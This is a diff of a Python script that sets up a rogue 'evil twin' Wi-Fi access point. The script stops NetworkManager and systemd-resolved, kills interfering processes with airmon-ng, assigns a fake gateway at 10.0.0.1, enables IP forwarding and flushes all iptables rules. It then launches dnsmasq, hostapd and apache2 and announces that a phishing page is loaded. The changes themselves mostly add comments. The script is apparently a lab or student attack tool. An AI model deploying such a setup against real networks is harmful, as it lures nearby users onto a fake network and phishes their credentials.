@@ -10,20 +10,22 @@ network_name = sys.argv[2]
 do_command('systemctl disable systemd-resolved.service') # release port 53
 do_command('systemctl stop systemd-resolved')  # release port 53
 
-do_command('service NetworkManager stop')
 
+do_command('service NetworkManager stop')
 ifconfig = "ifconfig " + sniffer_interface + " 10.0.0.1 netmask 255.255.255.0" # AP with address 10.0.0.1 with free 8 bits
 
 do_command('airmon-ng check kill')
 do_command(ifconfig)
 do_command('route add default gw 10.0.0.1') # create fake gw
 
-do_command('echo 1 > /proc/sys/net/ipv4/ip_forward')
+do_command('echo 1 > /proc/sys/net/ipv4/ip_forward') # enable ip forwarding
+# clear firewall ruled which might block some request
 do_command('iptables --flush')
 do_command('iptables --table nat --flush')
 do_command('iptables --delete-chain')
 do_command('iptables --table nat --delete-chain')
-do_command('iptables -P FORWARD ACCEPT')
+# enable forwarding
+do_command('iptables -P FORWARD ACCEPT') #
 
 line = "python3 create_files.py " + sniffer_interface + " " + network_name
 do_command(line)
@@ -31,7 +33,7 @@ do_command(line)
 do_command('dnsmasq -C dnsmasq.conf')
 do_command('hostapd hostapd.conf -B')
 do_command('service apache2 start')
-do_command('route add default gw 10.0.0.1')
+do_command('route add default gw 10.0.0.1') # create fake gw
 time.sleep(1)
 print('---> Phishing page loaded \n')
 
@@ -50,6 +52,7 @@ while True:
         except OSError:
             print("removing hostapd.conf failed")
 
+        # cleaning
         do_command('service NetworkManager start')
         do_command('service hostapd stop')
         do_command('service apache2 stop')
